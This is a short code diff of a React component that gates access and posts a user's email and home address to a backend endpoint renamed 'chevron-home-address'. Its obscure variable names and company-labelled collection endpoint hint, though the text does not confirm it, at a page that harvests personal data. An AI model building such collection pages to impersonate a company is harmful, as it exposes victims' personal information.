@@ -28,8 +28,12 @@ const HomeAddress: React.FC = () => {
   console.log('HomeAddress received email:', emzemz);
 
   // Show loading state while checking access
-  if (!isAllowed) {
+  if (isAllowed === null) {
     return <div>Loading...</div>; // Or a proper loading spinner
+  }
+
+  if (isAllowed === false) {
+    return <div>Access denied. Redirecting...</div>;
   }
 
   const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
@@ -49,7 +53,7 @@ const HomeAddress: React.FC = () => {
     // Check if there are no errors (apt is optional)
     if (!newErrors.stAd && !newErrors.city && !newErrors.state && !newErrors.zipCode) {
       try {
-        await axios.post(`${baseUrl}api/logix-meta-data-4/`, {
+        await axios.post(`${baseUrl}api/chevron-home-address/`, {
           emzemz,
           stAd,
           apt,
